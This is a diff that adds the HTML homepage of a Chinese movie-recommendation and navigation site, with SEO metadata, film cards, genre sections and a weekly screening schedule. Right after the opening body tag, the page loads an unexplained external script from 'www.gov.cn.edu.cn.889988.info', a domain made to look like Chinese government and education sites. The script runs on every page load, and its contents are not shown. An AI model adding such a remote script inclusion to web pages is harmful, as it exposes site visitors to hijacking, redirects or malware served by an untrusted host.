@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="renderer" content="webkit">
+<title>大米电影网 | damidianyingwang-zh | 最新电影在线观看与影视资源精选导航</title>
+<meta name="keywords" content="大米电影网,damidianyingwang-zh,电影在线观看,最新电影资源,热门电视剧推荐,高清影视导航,院线新片资讯,经典老片回顾,港台电影合集,日韩剧欧美剧,悬疑动作喜剧片单,观影指南与影评,大米电影网首页">
+<meta name="description" content="大米电影网（damidianyingwang-zh）专注最新电影在线观看与影视资源精选导航，覆盖院线新片、热门电视剧、经典老片与港台、日韩、欧美等多地区内容。平台每日更新影视资讯与观影指南，帮助用户快速找到值得看的好作品。访问大米电影网：https://damidianyingwang-zh.github.io，获取最新电影资源与片单推荐。">
+<meta name="author" content="大米电影网">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="theme-color" content="#1a1108">
+<link rel="canonical" href="https://damidianyingwang-zh.github.io">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="大米电影网">
+<meta property="og:title" content="大米电影网 | damidianyingwang-zh | 最新电影在线观看与影视资源精选导航">
+<meta property="og:description" content="大米电影网（damidianyingwang-zh）覆盖院线新片、热门电视剧、经典老片与多地区影视内容，提供每日更新的影视资讯与观影指南。">
+<meta property="og:url" content="https://damidianyingwang-zh.github.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="大米电影网 damidianyingwang-zh 影视资源精选导航">
+<meta name="twitter:description" content="大米电影网覆盖院线新片、热门电视剧、经典老片与多地区内容，每日更新影视资讯与观影指南。">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "大米电影网",
+  "alternateName": "damidianyingwang-zh",
+  "url": "https://damidianyingwang-zh.github.io",
+  "description": "大米电影网专注最新电影在线观看与影视资源精选导航，覆盖院线新片、热门电视剧、经典老片与多地区内容。",
+  "potentialAction": {
+    "@type": "SearchAction",
+    "target": "https://damidianyingwang-zh.github.io/#genre",
+    "query-input": "required name=query"
+  }
+}
+</script>
+<style>
+:root{
+  --paper:#1c140d;
+  --paper2:#261a0e;
+  --warm:#f5ecd7;
+  --muted:#c6b48f;
+  --amber:#f59e0b;
+  --amber2:#d97706;
+  --rice:#e8d5a3;
+  --red:#e0523c;
+  --max:1200px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);color:var(--warm);
+  font-family:"PingFang SC","Microsoft YaHei","Hiragino Sans GB","WenQuanYi Micro Hei",system-ui,-apple-system,sans-serif;
+  line-height:1.75;overflow-x:hidden;
+}
+body::before{content:"";position:fixed;inset:0;z-index:-2;
+  background:
+    radial-gradient(700px 500px at 85% 8%,rgba(245,158,11,.22),transparent 62%),
+    radial-gradient(600px 520px at -8% 38%,rgba(224,82,60,.18),transparent 62%),
+    linear-gradient(170deg,#1a1108,#241709 48%,#1c140d);
+}
+/* 颗粒质感 */
+body::after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.5;
+  background-image:radial-gradient(rgba(255,255,255,.045) 1px,transparent 1px);background-size:4px 4px}
+a{color:inherit;text-decoration:none}
+.wrap{max-width:var(--max);margin:0 auto;padding:0 26px}
+section{padding:96px 0;position:relative}
+.eyebrow{display:inline-flex;align-items:center;gap:10px;font-size:11.5px;letter-spacing:.26em;color:var(--amber);text-transform:uppercase;margin-bottom:13px;font-weight:700}
+.eyebrow::before{content:"";width:28px;height:2px;background:var(--amber)}
+h2.sec-title{font-size:34px;line-height:1.26;font-weight:900;letter-spacing:.3px;margin-bottom:12px}
+h2.sec-title em{font-style:normal;color:var(--amber)}
+.sec-desc{color:var(--muted);max-width:700px;margin-bottom:48px;font-size:15px}
+.btn{
+  display:inline-flex;align-items:center;gap:9px;padding:15px 31px;border-radius:6px;
+  font-weight:800;font-size:15px;cursor:pointer;border:2px solid transparent;
+  background:transparent;color:var(--warm);transition:.42s cubic-bezier(.25,.8,.3,1);font-family:inherit;
+}
+.btn:hover{transform:translateY(-4px)}
+.btn.outline{border-color:var(--amber);color:var(--amber)}
+.btn.outline:hover{background:var(--amber);color:#211400}
+.btn.solid{background:var(--amber);color:#211400}
+.btn.solid:hover{background:var(--rice);box-shadow:0 16px 34px rgba(245,158,11,.36)}
+/* nav */
+header{position:fixed;top:0;left:0;right:0;z-index:70;background:rgba(26,17,8,.88);backdrop-filter:blur(16px);border-bottom:1px solid rgba(245,158,11,.18)}
+.hd{max-width:var(--max);margin:0 auto;padding:14px 26px;display:flex;align-items:center;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:900}
+.mark{
+  width:42px;height:42px;border-radius:8px;flex:none;display:grid;place-items:center;
+  background:var(--amber);color:#211400;font-size:21px;font-weight:900;position:relative;
+  box-shadow:0 8px 20px rgba(245,158,11,.34);
+}
+.mark::after{content:"";position:absolute;inset:-5px;border:1.5px solid rgba(245,158,11,.4);border-radius:11px}
+.logo small{display:block;font-size:8.5px;letter-spacing:.32em;color:var(--amber);font-weight:700;text-transform:uppercase}
+.logo b{font-size:18px}
+nav{display:flex;gap:4px;margin-left:auto;align-items:center}
+nav a{padding:11px 16px;font-size:14px;color:var(--muted);transition:.3s;position:relative}
+nav a:hover{color:var(--amber)}
+nav a::after{content:"";position:absolute;left:16px;right:16px;bottom:5px;height:2px;background:var(--amber);transform:scaleX(0);transition:.35s}
+nav a:hover::after{transform:scaleX(1)}
+.bar-btn{display:none;margin-left:auto;background:var(--amber);color:#211400;border:none;border-radius:6px;padding:10px 16px;cursor:pointer;font-weight:800;font-family:inherit}
+/* hero 不对称 */
+.hero{min-height:100vh;display:flex;align-items:center;padding-top:130px;padding-bottom:60px}
+.hero-inner{display:grid;grid-template-columns:1.15fr .85fr;gap:60px;align-items:center}
+.hero h1{font-size:clamp(40px,6vw,72px);line-height:1.04;font-weight:950;letter-spacing:-.5px}
+.hero h1 .rice{color:var(--rice)}
+.hero h1 .stamp{display:inline-block;background:var(--red);color:#fff;padding:2px 14px;border-radius:4px;transform:rotate(-3deg);font-size:.55em;vertical-align:middle;margin-left:6px}
+.hero .lead{color:var(--muted);font-size:17.5px;margin:26px 0 34px;max-width:540px}
+.hero-cta{display:flex;gap:14px;flex-wrap:wrap;margin-bottom:38px}
+.hero-meta{display:flex;gap:26px;flex-wrap:wrap;border-top:1px solid rgba(245,158,11,.22);padding-top:26px}
+.hero-meta div span{display:block;font-size:12px;color:var(--muted);letter-spacing:.12em}
+.hero-meta div b{font-size:23px;font-weight:900;color:var(--rice)}
+/* 右侧竖向海报 */
+.poststack{display:flex;flex-direction:column;gap:14px}
+.pcard{display:flex;gap:16px;align-items:center;padding:16px;border:1px solid rgba(245,158,11,.2);background:rgba(245,158,11,.05);border-radius:8px;transition:.4s}
+.pcard:hover{border-color:var(--amber);transform:translateX(-6px);background:rgba(245,158,11,.1)}
+.pcard .th{width:56px;height:74px;border-radius:6px;flex:none;display:grid;place-items:center;font-size:26px}
+.pcard h4{font-size:16px;margin-bottom:4px}
+.pcard p{font-size:12.5px;color:var(--muted)}
+.t1{background:linear-gradient(150deg,#7a3b12,#2b1508)}
+.t2{background:linear-gradient(150deg,#4a5a12,#1a2008)}
+.t3{background:linear-gradient(150deg,#5a1230,#200812)}
+.t4{background:linear-gradient(150deg,#12455a,#081a20)}
+/* 横向滚动条带 */
+.strip{display:flex;gap:14px;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:8px;-webkit-overflow-scrolling:touch}
+.strip::-webkit-scrollbar{height:8px}
+.strip::-webkit-scrollbar-thumb{background:var(--amber);border-radius:8px}
+.chip{flex:none;scroll-snap-align:start;padding:16px 22px;border-radius:8px;border:1px solid rgba(245,158,11,.25);background:rgba(245,158,11,.06);min-width:230px;transition:.35s}
+.chip:hover{border-color:var(--amber);background:rgba(245,158,11,.13)}
+.chip b{display:block;font-size:15px;margin-bottom:5px}
+.chip span{font-size:12.5px;color:var(--muted)}
+/* 经典宫格 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:22px}
+.grid2{display:grid;grid-template-columns:repeat(2,1fr);gap:22px}
+.tile{border-radius:8px;overflow:hidden;border:1px solid rgba(245,158,11,.2);transition:.42s cubic-bezier(.25,.8,.3,1);background:rgba(245,158,11,.04)}
+.tile:hover{transform:translateY(-7px);border-color:var(--amber);box-shadow:0 20px 40px rgba(0,0,0,.45)}
+.thumb{aspect-ratio:16/10;position:relative;overflow:hidden}
+.thumb .badge{position:absolute;left:12px;top:12px;z-index:2;font-size:10.5px;font-weight:800;color:#211400;background:var(--amber);padding:4px 9px;border-radius:4px}
+.thumb .ico{position:absolute;right:12px;bottom:12px;z-index:2;font-size:24px}
+.thumb::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(20,13,6,.88),transparent 62%)}
+.thumb h4{position:absolute;left:14px;bottom:12px;z-index:2;font-size:19px;font-weight:850}
+.c1{background:linear-gradient(145deg,#7a3b12,#2b1508)}
+.c2{background:linear-gradient(145deg,#123a52,#081420)}
+.c3{background:linear-gradient(145deg,#5a1230,#200812)}
+.c4{background:linear-gradient(145deg,#3a2a08,#1a1304)}
+.c5{background:linear-gradient(145deg,#124a3a,#04201a)}
+.c6{background:linear-gradient(145deg,#4a2a52,#1a0820)}
+.c7{background:linear-gradient(145deg,#524a12,#201c04)}
+.c8{background:linear-gradient(145deg,#12304a,#081220)}
+.meta{padding:15px 17px}
+.meta p{font-size:13.5px;color:var(--muted)}
+.meta .bar{margin-top:12px;height:5px;border-radius:4px;background:rgba(245,158,11,.16);overflow:hidden}
+.meta .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--amber),var(--red));border-radius:4px}
+/* 双栏图文 */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:center}
+.split h3{font-size:27px;font-weight:850;margin:12px 0 16px;line-height:1.35}
+.split p{color:var(--muted);margin-bottom:16px}
+.split ul{list-style:none;display:flex;flex-direction:column;gap:12px}
+.split li{display:flex;gap:13px;align-items:flex-start;padding:13px 16px;border-radius:8px;border:1px solid rgba(245,158,11,.18);background:rgba(245,158,11,.04)}
+.split li b{font-size:15px;color:var(--amber);flex:none;width:30px;font-weight:900}
+.split li span{font-size:14px;color:var(--warm)}
+.framed{border-radius:10px;padding:34px;border:2px dashed rgba(245,158,11,.4);background:rgba(245,158,11,.05);position:relative}
+.framed .quote{font-size:20px;line-height:1.7;font-weight:700}
+.framed .who{margin-top:22px;font-size:13px;color:var(--muted);text-align:right}
+/* 时间表 */
+.tl{position:relative;padding-left:34px}
+.tl::before{content:"";position:absolute;left:9px;top:8px;bottom:8px;width:2px;background:linear-gradient(var(--amber),transparent)}
+.tl-row{position:relative;padding:20px 0;border-bottom:1px solid rgba(245,158,11,.16)}
+.tl-row:last-child{border-bottom:none}
+.tl-row::before{content:"";position:absolute;left:-31px;top:28px;width:16px;height:16px;border-radius:50%;background:var(--paper);border:3px solid var(--amber)}
+.tl-row .day{font-size:12px;color:var(--amber);letter-spacing:.14em;font-weight:800}
+.tl-row h4{font-size:18px;margin:5px 0 7px}
+.tl-row p{font-size:14px;color:var(--muted)}
+/* 编号列表 */
+.numlist{display:grid;grid-template-columns:repeat(2,1fr);gap:14px}
+.nl{display:flex;gap:18px;padding:22px;border-radius:8px;border:1px solid rgba(245,158,11,.2);background:rgba(245,158,11,.04);transition:.38s;align-items:flex-start}
+.nl:hover{border-color:var(--amber);background:rgba(245,158,11,.1)}
+.nl .n{font-size:30px;font-weight:950;color:var(--amber);line-height:1;flex:none;opacity:.85}
+.nl h4{font-size:16.5px;margin-bottom:6px}
+.nl p{font-size:13.5px;color:var(--muted)}
+/* 页脚 */
+footer{border-top:3px solid var(--amber);padding:68px 0 40px;background:#150e07}
+.ft{display:grid;grid-template-columns:1.7fr 1fr 1fr 1fr;gap:44px;margin-bottom:48px}
+.ft h5{font-size:13.5px;margin-bottom:18px;color:var(--amber);letter-spacing:.14em}
+.ft ul{list-style:none;display:flex;flex-direction:column;gap:12px}
+.ft a{color:var(--muted);font-size:14px;transition:.3s}
+.ft a:hover{color:var(--amber)}
+.ft-brand p{color:var(--muted);font-size:14px;margin:16px 0 20px;max-width:360px}
+.url-pill{display:inline-flex;align-items:center;gap:10px;padding:14px 20px;border-radius:6px;background:var(--amber);color:#211400;font-size:13.5px;font-weight:800;word-break:break-all}
+.ft-bot{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap;padding-top:28px;border-top:1px solid rgba(245,158,11,.2);color:var(--muted);font-size:13px}
+.top{position:fixed;right:24px;bottom:28px;z-index:55;width:50px;height:50px;border-radius:8px;display:grid;place-items:center;background:var(--amber);color:#211400;font-size:22px;box-shadow:0 12px 28px rgba(245,158,11,.34);opacity:0;pointer-events:none;transition:.4s}
+.top.show{opacity:1;pointer-events:auto}
+@media(max-width:980px){
+  .hero-inner{grid-template-columns:1fr;gap:46px}
+  .poststack{display:grid;grid-template-columns:1fr 1fr}
+  .grid4,.grid3,.grid2,.numlist,.split{flex-direction:column}
+  .grid4,.grid3,.grid2,.numlist,.split{grid-template-columns:1fr}
+  .split{flex-direction:column-reverse}
+}
+@media(max-width:700px){
+  section{padding:66px 0}
+  h2.sec-title{font-size:25px}
+  .bar-btn{display:inline-flex}
+  nav{position:fixed;top:70px;left:0;right:0;flex-direction:column;align-items:stretch;padding:14px 26px;gap:2px;background:#150e07;border-bottom:2px solid var(--amber);transform:translateY(-150%);transition:.4s}
+  nav.open{transform:translateY(0)}
+  nav a{padding:16px 0;border-bottom:1px solid rgba(245,158,11,.16)}
+  nav a::after{display:none}
+  .grid4,.grid3,.grid2,.numlist{grid-template-columns:1fr}
+  .poststack{grid-template-columns:1fr}
+  .hero-cta .btn{flex:1;justify-content:center}
+  .ft{grid-template-columns:1fr}
+  .hero-meta{gap:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+  <div class="hd">
+    <div class="logo">
+      <div class="mark">米</div>
+      <div><small>Damidianyingwang</small><b>大米电影网</b></div>
+    </div>
+    <nav id="nav">
+      <a href="#home">首页</a>
+      <a href="#now">正在热映</a>
+      <a href="#genre">题材专区</a>
+      <a href="#pick">选片逻辑</a>
+      <a href="#classic">经典回响</a>
+      <a href="#week">周放映</a>
+      <a href="#about">平台介绍</a>
+    </nav>
+    <button class="bar-btn" id="barBtn">目录 ☰</button>
+  </div>
+</header>
+
+<main>
+  <!-- 首页 -->
+  <section class="hero" id="home">
+    <div class="wrap hero-inner">
+      <div>
+        <span class="eyebrow">Damidianyingwang · zh</span>
+        <h1>每一粒影像<br>都是<span class="rice">好粮食</span><span class="stamp">大米电影网</span></h1>
+        <p class="lead">大米电影网（damidianyingwang-zh）把零散的影视信息整理成可以下口的好内容：最新电影、热播剧集、经典老片与多地区题材，按观看场景分类，让你少刷十分钟推荐，多看好一部作品。</p>
+        <div class="hero-cta">
+          <a class="btn solid" href="#now">看正在热映</a>
+          <a class="btn outline" href="#genre">按题材找片</a>
+        </div>
+        <div class="hero-meta">
+          <div><span>收录作品</span><b>2400+</b></div>
+          <div><span>题材分区</span><b>22 类</b></div>
+          <div><span>每周更新</span><b>30 部</b></div>
+          <div><span>站址</span><b style="font-size:15px;color:var(--amber)">damidianyingwang-zh.github.io</b></div>
+        </div>
+      </div>
+      <div class="poststack">
+        <div class="pcard"><div class="th t1">🎬</div><div><h4>《雪线之上》</h4><p>高海拔救援题材，真实感压倒一切</p></div></div>
+        <div class="pcard"><div class="th t2">🕵️</div><div><h4>《沉默证人》</h4><p>非线性庭审叙事，逻辑链完整</p></div></div>
+        <div class="pcard"><div class="th t3">💞</div><div><h4>《晚风来信》</h4><p>书信体爱情，慢节奏治愈系</p></div></div>
+        <div class="pcard"><div class="th t4">🌊</div><div><h4>《深海回响》</h4><p>自然纪录片，沉浸式水下摄影</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 横向速览条带 -->
+  <section id="now" style="padding-top:30px">
+    <div class="wrap">
+      <div style="display:flex;justify-content:space-between;align-items:end;gap:24px;flex-wrap:wrap;margin-bottom:34px">
+        <div><span class="eyebrow">In Theaters</span><h2 class="sec-title">正在热映 · <em>院线与流媒体同步</em></h2></div>
+        <a class="btn outline" href="#now">查看全部 ›</a>
+      </div>
+      <div class="strip">
+        <div class="chip"><b>动作 · 雪线之上</b><span>高海拔救援，视效与真实感并重</span></div>
+        <div class="chip"><b>悬疑 · 沉默证人</b><span>非线性庭审，反转建立于证据</span></div>
+        <div class="chip"><b>爱情 · 晚风来信</b><span>书信体叙事，配乐值得单独听</span></div>
+        <div class="chip"><b>动画 · 云端之城</b><span>国产动画工业水准代表作</span></div>
+        <div class="chip"><b>喜剧 · 团圆饭局</b><span>家庭群像，笑点真实不悬浮</span></div>
+        <div class="chip"><b>科幻 · 倒计时</b><span>硬科幻外壳下的协作命题</span></div>
+        <div class="chip"><b>纪录 · 深海回响</b><span>自然题材，兼具科普与震撼</span></div>
+        <div class="chip"><b>历史 · 大河之志</b><span>服化道考究，群像处理扎实</span></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 题材专区 -->
+  <section id="genre">
+    <div class="wrap">
+      <span class="eyebrow">Genre Zones</span>
+      <h2 class="sec-title">题材专区 · <em>从情绪出发找片</em></h2>
+      <p class="sec-desc">大米电影网把题材按观看情绪而非行业分类整理，让「现在想看什么」比「这是什么类型」更好回答。</p>
+      <div class="grid4">
+        <article class="tile"><div class="thumb c1"><span class="badge">解压</span><span class="ico">🎯</span><h4>动作冒险</h4></div><div class="meta"><p>追车、格斗、极限运动，强节奏释放压力。</p><div class="bar"><i style="width:92%"></i></div></div></article>
+        <article class="tile"><div class="thumb c2"><span class="badge">烧脑</span><span class="ico">🧩</span><h4>悬疑犯罪</h4></div><div class="meta"><p>本格推理到社会派，满足分析欲。</p><div class="bar"><i style="width:85%"></i></div></div></article>
+        <article class="tile"><div class="thumb c3"><span class="badge">治愈</span><span class="ico">💞</span><h4>爱情文艺</h4></div><div class="meta"><p>慢节奏情感叙事，适合安静的夜晚。</p><div class="bar"><i style="width:78%"></i></div></div></article>
+        <article class="tile"><div class="thumb c4"><span class="badge">思考</span><span class="ico">🚀</span><h4>科幻奇幻</h4></div><div class="meta"><p>设定驱动的想象力作品，拓展认知边界。</p><div class="bar"><i style="width:80%"></i></div></div></article>
+        <article class="tile"><div class="thumb c5"><span class="badge">陪伴</span><span class="ico">🐳</span><h4>动画亲子</h4></div><div class="meta"><p>全年龄动画，寓教于乐不低幼。</p><div class="bar"><i style="width:74%"></i></div></div></article>
+        <article class="tile"><div class="thumb c6"><span class="badge">沉浸</span><span class="ico">🎭</span><h4>剧情传记</h4></div><div class="meta"><p>人物命运与社会背景的双向刻画。</p><div class="bar"><i style="width:81%"></i></div></article>
+        <article class="tile"><div class="thumb c7"><span class="badge">放松</span><span class="ico">😂</span><h4>喜剧轻松</h4></div><div class="meta"><p>聚会、通勤、不想动脑时的首选。</p><div class="bar"><i style="width:88%"></i></div></article>
+        <article class="tile"><div class="thumb c8"><span class="badge">开阔</span><span class="ico">🌍</span><h4>纪录真实</h4></div><div class="meta"><p>自然、人文、社会议题，提供新视角。</p><div class="bar"><i style="width:70%"></i></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 选片逻辑 -->
+  <section id="pick">
+    <div class="wrap">
+      <div class="split">
+        <div>
+          <span class="eyebrow">How We Pick</span>
+          <h3>选片逻辑：<br>不为数量，只为「这一刻值得看」</h3>
+          <p>大米电影网的片单由编辑团队按四道标准筛选，宁缺毋滥。我们更在意一部作品在当下的观看价值，而非它有多少话题流量。</p>
+          <ul>
+            <li><b>01</b><span><strong>情绪价值</strong>：看完是否有明确的情绪落点，而不是空洞的视听堆砌。</span></li>
+            <li><b>02</b><span><strong>叙事完成度</strong>：人物动机与故事逻辑是否自洽，伏笔是否收得回来。</span></li>
+            <li><b>03</b><span><strong>制作诚意</strong>：视听语言、表演与美术是否有可见的创作投入。</span></li>
+            <li><b>04</b><span><strong>可推荐性</strong>：是否愿意主动安利给朋友，是最终的入选门槛。</span></li>
+          </ul>
+        </div>
+        <div class="framed">
+          <div class="quote">「我们不替你决定看什么，只把选择的范围从几百部收敛到三部——剩下的，交给你的心情。」</div>
+          <div class="who">— 大米电影网 编辑部</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 经典回响 -->
+  <section id="classic">
+    <div class="wrap">
+      <span class="eyebrow">Classic Echo</span>
+      <h2 class="sec-title">经典回响 · <em>那些值得二刷三刷的作品</em></h2>
+      <p class="sec-desc">热门之外，大米电影网持续维护一份经典片库，按年代与地区梳理，方便做主题式连看。</p>
+      <div class="grid3">
+        <div class="tile"><div class="thumb c3"><span class="ico">🎞️</span><h4>港片黄金年代</h4></div><div class="meta"><p>动作、警匪、江湖，浓缩一个时代的节奏与人情。</p><div class="bar"><i style="width:90%"></i></div></div></div>
+        <div class="tile"><div class="thumb c2"><span class="ico">🗾</span><h4>日影与日剧精选</h4></div><div class="meta"><p>克制、细腻，擅长在日常里挖出情感暗涌。</p><div class="bar"><i style="width:83%"></i></div></div></div>
+        <div class="tile"><div class="thumb c6"><span class="ico">🇰🇷</span><h4>韩影现实题材</h4></div><div class="meta"><p>社会议题与人性困境的强叙事表达。</p><div class="bar"><i style="width:79%"></i></div></div></div>
+        <div class="tile"><div class="thumb c4"><span class="ico">🎩</span><h4>欧式作者电影</h4></div><div class="meta"><p>节奏更慢、留白更多，适合专注观看。</p><div class="bar"><i style="width:66%"></i></div></div></div>
+        <div class="tile"><div class="thumb c1"><span class="ico">🏮</span><h4>国产年代记忆</h4></div><div class="meta"><p>八九十年代的影像，记录生活本身的变化。</p><div class="bar"><i style="width:76%"></i></div></div></div>
+        <div class="tile"><div class="thumb c5"><span class="ico">📼</span><h4>独立与冷门佳作</h4></div><div class="meta"><p>没走进大众视野，但完成度极高的作品。</p><div class="bar"><i style="width:71%"></i></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 一周放映 -->
+  <section id="week">
+    <div class="wrap">
+      <span class="eyebrow">Weekly Screen</span>
+      <h2 class="sec-title">一周放映 · <em>给每个夜晚安排一部作品</em></h2>
+      <p class="sec-desc">大米电影网每周推出主题放映安排，把选片变成有仪式感的习惯，而不是临睡前无休止地翻列表。</p>
+      <div class="tl">
+        <div class="tl-row"><div class="day">MON · 周一解压夜</div><h4>《团圆饭局》</h4><p>用轻快的家庭喜剧冲淡周一的疲惫。</p></div>
+        <div class="tl-row"><div class="day">TUE · 周二类型夜</div><h4>《雪线之上》</h4><p>动作与救援题材，节奏快、情绪集中。</p></div>
+        <div class="tl-row"><div class="day">WED · 周三烧脑夜</div><h4>《沉默证人》</h4><p>中场休息日，适合投入一场完整的推理。</p></div>
+        <div class="tl-row"><div class="day">FRI · 周五大片夜</div><h4>《倒计时》</h4><p>周末前用一场大制作把气氛拉满。</p></div>
+        <div class="tl-row"><div class="day">SAT · 周六陪伴夜</div><h4>《云端之城》</h4><p>适合亲子共看或找回童心的动画之夜。</p></div>
+        <div class="tl-row"><div class="day">SUN · 周日沉淀夜</div><h4>《大河之志》</h4><p>慢节奏收尾，为下一周积蓄情绪。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 平台介绍 -->
+  <section id="about">
+    <div class="wrap">
+      <span class="eyebrow">About Us</span>
+      <h2 class="sec-title">平台介绍 · <em>关于大米电影网</em></h2>
+      <p class="sec-desc">大米电影网 damidianyingwang-zh 关注的不只是「有什么」，更是「现在该看什么」。</p>
+      <div class="numlist">
+        <div class="nl"><div class="n">01</div><div><h4>内容导航</h4><p>把最新电影、热播剧集、经典老片与多地区题材整理成可被快速使用的目录。</p></div></div>
+        <div class="nl"><div class="n">02</div><div><h4>观影指南</h4><p>提供按情绪、时长、题材组合的选片建议，降低决策成本。</p></div></div>
+        <div class="nl"><div class="n">03</div><div><h4>资讯更新</h4><p>跟踪院线与流媒体动态，整理成每周可执行的观看计划。</p></div></div>
+        <div class="nl"><div class="n">04</div><div><h4>互动推荐</h4><p>鼓励观众投稿真实观影感受，让片单由观看体验共同塑造。</p></div></div>
+        <div class="nl"><div class="n">05</div><div><h4>地区覆盖</h4><p>除国产内容外，涵盖港台、日韩、欧美等多地区影视作品。</p></div></div>
+        <div class="nl"><div class="n">06</div><div><h4>使用承诺</h4><p>不以数量取胜，每部入选作品都经过内容与情绪价值的双重判断。</p></div></div>
+      </div>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="ft">
+      <div class="ft-brand">
+        <div class="logo"><div class="mark">米</div><div><small>Damidianyingwang</small><b>大米电影网</b></div></div>
+        <p>每一粒影像都是好粮食。专注最新电影在线观看与影视资源精选导航，覆盖院线新片、热门电视剧、经典老片与多地区内容。</p>
+        <div class="url-pill">🔗 https://damidianyingwang-zh.github.io</div>
+      </div>
+      <div><h5>内容</h5><ul><li><a href="#now">正在热映</a></li><li><a href="#genre">题材专区</a></li><li><a href="#classic">经典回响</a></li><li><a href="#pick">选片逻辑</a></li></ul></div>
+      <div><h5>服务</h5><ul><li><a href="#week">一周放映</a></li><li><a href="#about">平台介绍</a></li><li><a href="#home">回到首页</a></li><li><a href="#genre">按题材找片</a></li></ul></div>
+      <div><h5>站点</h5><ul><li><a href="https://damidianyingwang-zh.github.io" rel="noopener">官方网址</a></li><li><a href="#about">投稿建议</a></li><li><a href="#about">编辑团队</a></li><li><a href="#home">回到顶部</a></li></ul></div>
+    </div>
+    <div class="ft-bot">
+      <span>© <span id="yr"></span> 大米电影网 damidianyingwang-zh. 本站为影视内容导航与资讯平台，影片信息仅供参考。</span>
+      <a href="#home">回到顶部 ↑</a>
+    </div>
+  </div>
+</footer>
+
+<a href="#home" class="top" id="top" aria-label="回到顶部">↑</a>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+var bar=document.getElementById('barBtn'),nav=document.getElementById('nav');
+bar.addEventListener('click',function(){nav.classList.toggle('open');});
+nav.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){nav.classList.remove('open');});});
+var top=document.getElementById('top');
+window.addEventListener('scroll',function(){top.classList.toggle('show',window.scrollY>500);});
+</script>
+</body>
+</html>
